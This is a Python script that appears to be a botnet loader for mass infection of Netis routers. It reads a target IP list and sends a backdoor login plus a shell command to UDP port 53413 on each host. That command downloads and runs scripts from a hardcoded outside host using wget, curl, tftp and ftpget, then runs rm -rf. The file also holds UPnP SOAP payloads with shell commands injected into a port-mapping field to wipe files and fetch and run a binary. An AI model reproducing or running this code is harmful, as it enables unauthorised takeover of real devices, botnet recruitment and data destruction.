#!/usr/bin/python
# Netis Sploit 
#slumpthegod
#9/15/2018 4:37PM

import threading, sys, time, random, socket, re, os
bingen = "http://174.138.9.106/Netto"
rm = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/; rm -rf *`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>"
wget = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/; wget "+bingen+"`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>"
execute = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/; chmod 777 Netto; ./Netto Netto`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>"
headerlist = {'SOAPAction': 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'}

if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()
 
login = "AAAAAAAAnetcore\x00"
command = "AA\x00\x00AAAA cd /tmp; echo ''>DIRTEST || cd /var/run; echo ''>DIRTEST || cd /mnt; echo ''>DIRTEST || cd /root; echo ''>DIRTEST; wget http://174.138.9.106/8UsA.sh; curl -O http://174.138.9.106/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 174.138.9.106 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 174.138.9.106; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 174.138.9.106 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *"
list = open(sys.argv[1], "r").readlines()
offline = 0
class netis(threading.Thread):
        def __init__ (self, ip):
            threading.Thread.__init__(self)
            self.ip = str(ip).rstrip('\n')
        def run(self):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                print "\033[36m[\033[32mHitori V1.0\033[36m] \033[32mAttempting\033[35m:\033[32m%s\033[36m"%(self.ip)
                s.sendto(login, (self.ip, 53413))
                time.sleep(1.5)
                s.sendto(command, (self.ip, 53413))
                time.sleep(30)
            except Exception:
                pass
for ip in list:
    try:
        t = netis(ip)
        t.start()
        time.sleep(0.01)
    except:
        pass
		